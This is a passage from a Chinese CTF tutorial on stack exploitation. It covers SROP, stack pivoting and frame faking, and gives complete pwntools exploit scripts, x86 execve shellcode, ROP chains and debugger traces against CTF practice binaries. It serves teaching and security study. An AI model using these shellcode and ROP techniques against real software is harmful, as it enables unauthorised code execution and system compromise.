stack_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'leak stack addr :'</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>stack_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">## make the rsp point to stack_addr</span>
<span class="token comment" spellcheck="true">## the frame is read(0,stack_addr,0x400)</span>
sigframe <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>
sigframe<span class="token punctuation">.</span>rax <span class="token operator">=</span> constants<span class="token punctuation">.</span>SYS_read
sigframe<span class="token punctuation">.</span>rdi <span class="token operator">=</span> <span class="token number">0</span>
sigframe<span class="token punctuation">.</span>rsi <span class="token operator">=</span> stack_addr
sigframe<span class="token punctuation">.</span>rdx <span class="token operator">=</span> <span class="token number">0x400</span>
sigframe<span class="token punctuation">.</span>rsp <span class="token operator">=</span> stack_addr
sigframe<span class="token punctuation">.</span>rip <span class="token operator">=</span> syscall_ret
payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>start_addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>sigframe<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">## set rax=15 and call sigreturn</span>
sigreturn <span class="token operator">=</span> p64<span class="token punctuation">(</span>syscall_ret<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'b'</span> <span class="token operator">*</span> <span class="token number">7</span>
sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>sigreturn<span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">## call execv("/bin/sh",0,0)</span>
sigframe <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>
sigframe<span class="token punctuation">.</span>rax <span class="token operator">=</span> constants<span class="token punctuation">.</span>SYS_execve
sigframe<span class="token punctuation">.</span>rdi <span class="token operator">=</span> stack_addr <span class="token operator">+</span> <span class="token number">0x120</span>  <span class="token comment" spellcheck="true"># "/bin/sh" 's addr</span>
sigframe<span class="token punctuation">.</span>rsi <span class="token operator">=</span> <span class="token number">0x0</span>
sigframe<span class="token punctuation">.</span>rdx <span class="token operator">=</span> <span class="token number">0x0</span>
sigframe<span class="token punctuation">.</span>rsp <span class="token operator">=</span> stack_addr
sigframe<span class="token punctuation">.</span>rip <span class="token operator">=</span> syscall_ret

frame_payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>start_addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'b'</span> <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>sigframe<span class="token punctuation">)</span>
<span class="token keyword">print</span> len<span class="token punctuation">(</span>frame_payload<span class="token punctuation">)</span>
payload <span class="token operator">=</span> frame_payload <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">0x120</span> <span class="token operator">-</span> len<span class="token punctuation">(</span>frame_payload<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token string">'\x00'</span> <span class="token operator">+</span> <span class="token string">'/bin/sh\x00'</span>
sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>sigreturn<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>其基本流程为</p>
<ul>
<li>读取三个程序起始地址</li>
<li>程序返回时，利用第一个程序起始地址读取地址，修改返回地址(即第二个程序起始地址)为源程序的第二条指令，并且会设置rax=1</li>
<li>那么此时将会执行write(1,$esp,0x400)，泄露栈地址。</li>
<li>利用第三个程序起始地址进而读入payload</li>
<li>再次读取构造sigreturn调用，进而将向栈地址所在位置读入数据，构造execve(‘/bin/sh’,0,0)</li>
<li>再次读取构造sigreturn调用，从而获取shell。</li>
</ul>
<h1 id="花式栈溢出技巧"><a href="#花式栈溢出技巧" class="headerlink" title="花式栈溢出技巧"></a>花式栈溢出技巧</h1><h2 id="stack-pivoting"><a href="#stack-pivoting" class="headerlink" title="stack pivoting"></a>stack pivoting</h2><h3 id="原理-7"><a href="#原理-7" class="headerlink" title="原理"></a>原理</h3><p>stack pivoting，正如它所描述的，该技巧就是劫持栈指针指向攻击者所能控制的内存处，然后再在相应的位置进行 ROP。一般来说，我们可能在以下情况需要使用 stack pivoting</p>
<ul>
<li>可以控制的栈溢出的字节数较少，难以构造较长的 ROP 链</li>
<li>开启了 PIE 保护，栈地址未知，我们可以将栈劫持到已知的区域。</li>
<li>其它漏洞难以利用，我们需要进行转换，比如说将栈劫持到堆空间，从而在堆上写 rop 及进行堆漏洞利用</li>
</ul>
<p>此外，利用 stack pivoting 有以下几个要求</p>
<ul>
<li><p>可以控制程序执行流。</p>
</li>
<li><p>可以控制 sp 指针。一般来说，控制栈指针会使用 ROP，常见的控制栈指针的 gadgets 一般是</p>
</li>
</ul>
<pre class="line-numbers language-asm"><code class="language-asm">pop rsp/esp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>当然，还会有一些其它的姿势。比如说 libc_csu_init 中的 gadgets，我们通过偏移就可以得到控制 rsp 指针。上面的是正常的，下面的是偏移的。</p>
<pre class="line-numbers language-asm"><code class="language-asm">gef➤  x/7i 0x000000000040061a
0x40061a <__libc_csu_init+90>:    pop    rbx
0x40061b <__libc_csu_init+91>:    pop    rbp
0x40061c <__libc_csu_init+92>:    pop    r12
0x40061e <__libc_csu_init+94>:    pop    r13
0x400620 <__libc_csu_init+96>:    pop    r14
0x400622 <__libc_csu_init+98>:    pop    r15
0x400624 <__libc_csu_init+100>:    ret    
gef➤  x/7i 0x000000000040061d
0x40061d <__libc_csu_init+93>:    pop    rsp
0x40061e <__libc_csu_init+94>:    pop    r13
0x400620 <__libc_csu_init+96>:    pop    r14
0x400622 <__libc_csu_init+98>:    pop    r15
0x400624 <__libc_csu_init+100>:    ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>  此外，还有更加高级的 fake frame。</p>
<ul>
<li>存在可以控制内容的内存，一般有如下<ul>
<li>bss 段。由于进程按页分配内存，分配给 bss 段的内存大小至少一个页(4k，0x1000)大小。然而一般bss段的内容用不了这么多的空间，并且 bss 段分配的内存页拥有读写权限。</li>
<li>heap。但是这个需要我们能够泄露堆地址。</li>
</ul>
</li>
</ul>
<h3 id="示例-2"><a href="#示例-2" class="headerlink" title="示例"></a>示例</h3><h4 id="例1"><a href="#例1" class="headerlink" title="例1"></a>例1</h4><p>这里我们以 <a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/stackprivot/X-CTF%20Quals%202016%20-%20b0verfl0w" target="_blank" rel="noopener">X-CTF Quals 2016 - b0verfl0w</a> 为例进行介绍。首先，查看程序的安全保护，如下</p>
<pre class="line-numbers language-shell"><code class="language-shell">➜  X-CTF Quals 2016 - b0verfl0w git:(iromise) ✗ checksec b0verfl0w                 
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>可以看出源程序为 32 位，也没有开启 NX 保护，下面我们来找一下程序的漏洞</p>
<pre class="line-numbers language-C"><code class="language-C">signed int vul()
{
  char s; // [sp+18h] [bp-20h]@1

  puts("\n======================");
  puts("\nWelcome to X-CTF 2016!");
  puts("\n======================");
  puts("What's your name?");
  fflush(stdout);
  fgets(&s, 50, stdin);
  printf("Hello %s.", &s);
  fflush(stdout);
  return 1;
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>可以看出，源程序存在栈溢出漏洞。但是其所能溢出的字节就只有 50-0x20-4=14 个字节，所以我们很难执行一些比较好的 ROP。这里我们就考虑 stack pivoting 。由于程序本身并没有开启堆栈保护，所以我们可以在栈上布置shellcode 并执行。基本利用思路如下</p>
<ul>
<li>利用栈溢出布置 shellcode</li>
<li>控制 eip 指向 shellcode 处</li>
</ul>
<p>第一步，还是比较容易地，直接读取即可，但是由于程序本身会开启 ASLR 保护，所以我们很难直接知道 shellcode 的地址。但是栈上相对偏移是固定的，所以我们可以利用栈溢出对 esp 进行操作，使其指向 shellcode 处，并且直接控制程序跳转至 esp处。那下面就是找控制程序跳转到 esp 处的 gadgets 了。</p>
<pre class="line-numbers language-shell"><code class="language-shell">➜  X-CTF Quals 2016 - b0verfl0w git:(iromise) ✗ ROPgadget --binary b0verfl0w --only 'jmp|ret'         
Gadgets information
============================================================
0x08048504 : jmp esp
0x0804836a : ret
0x0804847e : ret 0xeac1

Unique gadgets found: 3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里我们发现有一个可以直接跳转到 esp 的 gadgets。那么我们可以布置 payload 如下</p>
<pre class="line-numbers language-text"><code class="language-text">shellcode|padding|fake ebp|0x08048504|set esp point to shellcode and jmp esp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>那么我们 payload 中的最后一部分改如何设置 esp 呢，可以知道</p>
<ul>
<li>size(shellcode+padding)=0x20</li>
<li>size(fake ebp)=0x4</li>
<li>size(0x08048504)=0x4</li>
</ul>
<p>所以我们最后一段需要执行的指令就是</p>
<pre class="line-numbers language-asm"><code class="language-asm">sub esp,0x28
jmp esp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>所以最后的 exp 如下</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./b0verfl0w'</span><span class="token punctuation">)</span>

shellcode_x86 <span class="token operator">=</span> <span class="token string">"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"</span>
shellcode_x86 <span class="token operator">+=</span> <span class="token string">"\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"</span>
shellcode_x86 <span class="token operator">+=</span> <span class="token string">"\x0b\xcd\x80"</span>

sub_esp_jmp <span class="token operator">=</span> asm<span class="token punctuation">(</span><span class="token string">'sub esp, 0x28;jmp esp'</span><span class="token punctuation">)</span>
jmp_esp <span class="token operator">=</span> <span class="token number">0x08048504</span>
payload <span class="token operator">=</span> shellcode_x86 <span class="token operator">+</span> <span class="token punctuation">(</span>
    <span class="token number">0x20</span> <span class="token operator">-</span> len<span class="token punctuation">(</span>shellcode_x86<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token string">'b'</span> <span class="token operator">+</span> <span class="token string">'bbbb'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>jmp_esp<span class="token punctuation">)</span> <span class="token operator">+</span> sub_esp_jmp
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="例2-转移堆"><a href="#例2-转移堆" class="headerlink" title="例2-转移堆"></a>例2-转移堆</h4><p>待。</p>
<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><ul>
<li><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/stackprivot/EkoPartyCTF%202016%20fuckzing-exploit-200" target="_blank" rel="noopener">EkoPartyCTF 2016 fuckzing-exploit-200</a></li>
</ul>
<h2 id="frame-faking"><a href="#frame-faking" class="headerlink" title="frame faking"></a>frame faking</h2><p>正如这个技巧名字所说的那样，这个技巧就是构造一个虚假的栈帧来控制程序的执行流。</p>
<h3 id="原理-8"><a href="#原理-8" class="headerlink" title="原理"></a>原理</h3><p>概括地讲，我们在之前讲的栈溢出不外乎两种方式</p>
<ul>
<li>控制程序 EIP</li>
<li>控制程序 EBP</li>
</ul>
<p>其最终都是控制程序的执行流。在 frame faking 中，我们所利用的技巧便是同时控制 EBP 与 EIP，这样我们在控制程序执行流的同时，也改变程序栈帧的位置。一般来说其 payload 如下</p>
<pre><code>buffer padding|fake ebp|leave ret addr|</code></pre><p>即我们利用栈溢出将栈上构造为如上格式。这里我们主要讲下后面两个部分</p>
<ul>
<li>函数的返回地址被我们覆盖为执行 leave ret 的地址，这就表明了函数在正常执行完自己的 leave ret 后，还会再次执行一次 leave ret。</li>
<li>其中 fake ebp 为我们构造的栈帧的基地址，需要注意的是这里是一个地址。一般来说我们构造的假的栈帧如下</li>
</ul>
<pre><code>fake ebp
|
v
ebp2|target function addr|leave ret addr|arg1|arg2</code></pre><p>这里我们的 fake ebp 指向 ebp2，即它为 ebp2 所在的地址。通常来说，这里都是我们能够控制的可读的内容。</p>
<p><strong>下面的汇编语法是 intel 语法。</strong></p>
<p>在我们介绍基本的控制过程之前，我们还是有必要说一下，函数的入口点与出口点的基本操作</p>
<p>入口点</p>
<pre><code>push ebp  # 将ebp压栈
mov ebp, esp #将esp的值赋给ebp</code></pre><p>出口点</p>
<pre><code>leave
ret #pop eip，弹出栈顶元素作为程序下一个执行地址</code></pre><p>其中 leave 指令相当于</p>
<pre><code>mov esp, ebp # 将ebp的值赋给esp
pop ebp # 弹出ebp</code></pre><p>下面我们来仔细说一下基本的控制过程。</p>
<ol>
<li><p>在有栈溢出的程序执行 leave 时，其分为两个步骤</p>
<ul>
<li>mov esp, ebp ，这会将 esp 也指向当前栈溢出漏洞的 ebp 基地址处。</li>
<li>pop ebp， 这会将栈中存放的 fake ebp 的值赋给 ebp。即执行完指令之后，ebp便指向了ebp2，也就是保存了 ebp2 所在的地址。</li>
</ul>
</li>
<li><p>执行 ret 指令，会再次执行 leave ret 指令。</p>
</li>
<li><p>执行 leave 指令，其分为两个步骤</p>
<ul>
<li>mov esp, ebp ，这会将 esp 指向 ebp2。</li>
<li>pop ebp，此时，会将 ebp 的内容设置为 ebp2 的值，同时 esp 会指向 target function。</li>
</ul>
</li>
<li><p>执行 ret 指令，这时候程序就会执行 target function，当其进行程序的时候会执行</p>
<ul>
<li><p>push ebp，会将 ebp2 值压入栈中，</p>
</li>
<li><p>mov ebp, esp，将 ebp 指向当前基地址。</p>
</li>
</ul>
</li>
</ol>
<p>此时的栈结构如下</p>
<pre><code>ebp
|
v
ebp2|leave ret addr|arg1|arg2</code></pre><ol start="5">
<li><p>当程序执行时，其会正常申请空间，同时我们在栈上也安排了该函数对应的参数，所以程序会正常执行。</p>
</li>
<li><p>程序结束后，其又会执行两次 leave ret addr，所以如果我们在 ebp2 处布置好了对应的内容，那么我们就可以一直控制程序的执行流程。</p>
</li>
</ol>
<p>可以看出在 fake frame 中，我们有一个需求就是，我们必须得有一块可以写的内存，并且我们还知道这块内存的地址，这一点与 stack pivoting 相似。</p>
<h3 id="2018-安恒杯-over"><a href="#2018-安恒杯-over" class="headerlink" title="2018 安恒杯 over"></a>2018 安恒杯 over</h3><p>以 2018 年 6 月安恒杯月赛的 over 一题为例进行介绍, 题目可以在 <a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/fake_frame/over" target="_blank" rel="noopener">ctf-challenge</a> 中找到</p>
<h4 id="文件信息"><a href="#文件信息" class="headerlink" title="文件信息"></a>文件信息</h4><pre class="line-numbers language-bash"><code class="language-bash">over.over: ELF 64-bit LSB executable, x86-64, version 1 <span class="token punctuation">(</span>SYSV<span class="token punctuation">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="token keyword">for</span> GNU/Linux 2.6.32, BuildID<span class="token punctuation">[</span>sha1<span class="token punctuation">]</span><span class="token operator">=</span>99beb778a74c68e4ce1477b559391e860dd0e946, stripped
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/m4x/pwn_repo/others_over/over.over'</span>
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>64 位动态链接的程序, 没有开 PIE 和 canary 保护, 但开了<br>NX 保护  </p>
<h4 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h4><p>放到 IDA 中进行分析 </p>
<pre class="line-numbers language-C"><code class="language-C">__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  while ( sub_400676() )
    ;
  return 0LL;
}

int sub_400676()
{
  char buf[80]; // [rsp+0h] [rbp-50h]

  memset(buf, 0, sizeof(buf));
  putchar('>');
  read(0, buf, 96uLL);
  return puts(buf);
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>漏洞很明显, read 能读入 96 位, 但 buf 的长度只有 80, 因此能覆盖 rbp 以及 ret addr 但也只能覆盖到 rbp 和 ret addr, 因此也只能通过同时控制 rbp 以及 ret addr 来进行 rop 了</p>
<h4 id="leak-stack"><a href="#leak-stack" class="headerlink" title="leak stack"></a>leak stack</h4><p>为了控制 rbp, 我们需要知道某些地址, 可以发现当输入的长度为 80 时, 由于 read 并不会给输入末尾补上 ‘\0’, rbp 的值就会被 puts 打印出来, 这样我们就可以通过固定偏移知道栈上所有位置的地址了</p>
<pre class="line-numbers language-C"><code class="language-C">Breakpoint 1, 0x00000000004006b9 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────
 RAX  0x7ffceaf11160 ◂— 0x3030303030303030 ('00000000')
 RBX  0x0
 RCX  0x7ff756e9b690 (__read_nocancel+7) ◂— cmp    rax, -0xfff
 RDX  0x60
 RDI  0x7ffceaf11160 ◂— 0x3030303030303030 ('00000000')
 RSI  0x7ffceaf11160 ◂— 0x3030303030303030 ('00000000')
 R8   0x7ff75715b760 (_IO_stdfile_1_lock) ◂— 0x0
 R9   0x7ff757354700 ◂— 0x7ff757354700
 R10  0x37b
 R11  0x246
 R12  0x400580 ◂— xor    ebp, ebp
 R13  0x7ffceaf112b0 ◂— 0x1
 R14  0x0
 R15  0x0
 RBP  0x7ffceaf111b0 —▸ 0x7ffceaf111d0 —▸ 0x400730 ◂— push   r15
 RSP  0x7ffceaf11160 ◂— 0x3030303030303030 ('00000000')
 RIP  0x4006b9 ◂— call   0x400530
─────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────
 ► 0x4006b9    call   puts@plt <0x400530>
        s: 0x7ffceaf11160 ◂— 0x3030303030303030 ('00000000')

   0x4006be    leave
   0x4006bf    ret

   0x4006c0    push   rbp
   0x4006c1    mov    rbp, rsp
   0x4006c4    sub    rsp, 0x10
   0x4006c8    mov    dword ptr [rbp - 4], edi
   0x4006cb    mov    qword ptr [rbp - 0x10], rsi
   0x4006cf    mov    rax, qword ptr [rip + 0x20098a] <0x601060>
   0x4006d6    mov    ecx, 0
   0x4006db    mov    edx, 2
─────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────
00:0000│ rax rdi rsi rsp  0x7ffceaf11160 ◂— 0x3030303030303030 ('00000000')
... ↓
───────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────
 ► f 0           4006b9
   f 1           400715
   f 2     7ff756de02b1 __libc_start_main+241
Breakpoint *0x4006B9
pwndbg> stack 15
00:0000│ rax rdi rsi rsp  0x7ffceaf11160 ◂— 0x3030303030303030 ('00000000')
... ↓
0a:0050│ rbp              0x7ffceaf111b0 —▸ 0x7ffceaf111d0 —▸ 0x400730 ◂— push   r15
0b:0058│                  0x7ffceaf111b8 —▸ 0x400715 ◂— test   eax, eax
0c:0060│                  0x7ffceaf111c0 —▸ 0x7ffceaf112b8 —▸ 0x7ffceaf133db ◂— './over.over'
0d:0068│                  0x7ffceaf111c8 ◂— 0x100000000
0e:0070│                  0x7ffceaf111d0 —▸ 0x400730 ◂— push   r15
pwndbg> distance 0x7ffceaf111d0 0x7ffceaf11160
0x7ffceaf111d0->0x7ffceaf11160 is -0x70 bytes (-0xe words)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>leak 出栈地址后, 我们就可以通过控制 rbp 为栈上的地址(如 0x7ffceaf11160), ret addr 为 leave ret 的地址来实现控制程序流程了。 </p>
<p>比如我们可以在 0x7ffceaf11160 + 0x8 填上 leak libc 的 rop chain 并控制其返回到 <code>sub_400676</code> 函数来 leak libc。 </p>
<p>然后在下一次利用时就可以通过 rop 执行 <code>system("/bin/sh")</code> 或 <code>execve("/bin/sh", 0, 0)</code> 来 get shell 了, 这道题目因为输入的长度足够, 我们可以布置调用 <code>execve("/bin/sh", 0, 0)</code> 的利用链, 这种方法更稳妥(<code>system("/bin/sh")</code> 可能会因为 env 被破坏而失效), 不过由于利用过程中栈的结构会发生变化, 所以一些关键的偏移还需要通过调试来确定</p>
<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>binary <span class="token operator">=</span> <span class="token string">"./over.over"</span>

<span class="token keyword">def</span> <span class="token function">DEBUG</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">:</span>
    raw_input<span class="token punctuation">(</span><span class="token string">"DEBUG: "</span><span class="token punctuation">)</span>
    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span>

io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./over.over"</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./over.over"</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc

io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">,</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">80</span><span class="token punctuation">)</span>
stack <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\x7f"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span> <span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\0'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x70</span>
success<span class="token punctuation">(</span><span class="token string">"stack -> {:#x}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>stack<span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token comment" spellcheck="true">#  DEBUG("b *0x4006B9\nc")</span>
io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">,</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'11111111'</span><span class="token punctuation">,</span> <span class="token number">0x400793</span><span class="token punctuation">,</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0x400676</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">80</span> <span class="token operator">-</span> <span class="token number">40</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token string">'1'</span><span class="token punctuation">,</span> stack<span class="token punctuation">,</span> <span class="token number">0x4006be</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
libc<span class="token punctuation">.</span>address <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\x7f"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span> <span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\0'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
success<span class="token punctuation">(</span><span class="token string">"libc.address -> {:#x}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>

pop_rdi_ret<span class="token operator">=</span><span class="token number">0x400793</span>
<span class="token triple-quoted-string string">'''
$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret"
0x00000000000f5279 : pop rdx ; pop rsi ; ret
'''</span>
pop_rdx_pop_rsi_ret<span class="token operator">=</span>libc<span class="token punctuation">.</span>address<span class="token operator">+</span><span class="token number">0xf5279</span>


payload<span class="token operator">=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'22222222'</span><span class="token punctuation">,</span> pop_rdi_ret<span class="token punctuation">,</span> next<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>pop_rdx_pop_rsi_ret<span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'execve'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">80</span> <span class="token operator">-</span> <span class="token number">7</span><span class="token operator">*</span><span class="token number">8</span> <span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token string">'2'</span><span class="token punctuation">,</span> stack <span class="token operator">-</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x4006be</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>

io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>总的来说这种方法跟 stack pivot 差别并不是很大。</p>
<h3 id="参考阅读"><a href="#参考阅读" class="headerlink" title="参考阅读"></a>参考阅读</h3><ul>
<li><a href="http://www.xfocus.net/articles/200602/851.html" target="_blank" rel="noopener">http://www.xfocus.net/articles/200602/851.html</a></li>
<li><a href="http://phrack.org/issues/58/4.html" target="_blank" rel="noopener">http://phrack.org/issues/58/4.html</a></li>
</ul>
